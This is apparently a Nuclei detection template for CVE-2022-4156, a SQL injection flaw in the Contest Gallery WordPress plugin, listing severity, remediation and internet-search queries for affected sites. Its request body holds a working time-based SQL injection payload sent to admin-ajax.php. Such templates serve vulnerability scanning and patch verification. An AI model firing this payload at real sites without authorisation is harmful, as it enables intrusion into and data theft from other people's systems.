id: CVE-2022-4156

info:
  name: Contest Gallery WordPress Plugin SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: The Contest Gallery WordPress plugin before 19.1.5.1 is vulnerable to SQL injection via the user_id POST parameter.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Update to the latest version of the Contest Gallery WordPress Plugin to mitigate the SQL Injection vulnerability (CVE-2022-4156).
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-4156
    epss-score: 0.00216
    epss-percentile: 0.60327
    cpe: cpe:2.3:a:contest-gallery:contest_gallery:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: contest-gallery
    product: contest_gallery
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/contest-gallery/"
    fofa-query: body=/wp-content/plugins/contest-gallery/
    publicwww-query: /wp-content/plugins/contest-gallery/

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      _wpnonce=5c8402bea9&cg_input_image_upload_file_to_delete_wp_id=1&_wp_http_referer=/wp-admin/profile.php&from=profile&checkuser_id=3&color-nonce=6f0655e068&admin_color=fresh&admin_bar_front=1&nickname=test1&display_name=test1&email=test1@c.com&cg_user_data_available=true&cg_user_id=3&action=post_cg_backend_image_upload&cg_input_image_upload_file[]=index.png&user_id=3 AND (SELECT 6037 FROM (SELECT(SLEEP(5)))Uiuu)

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
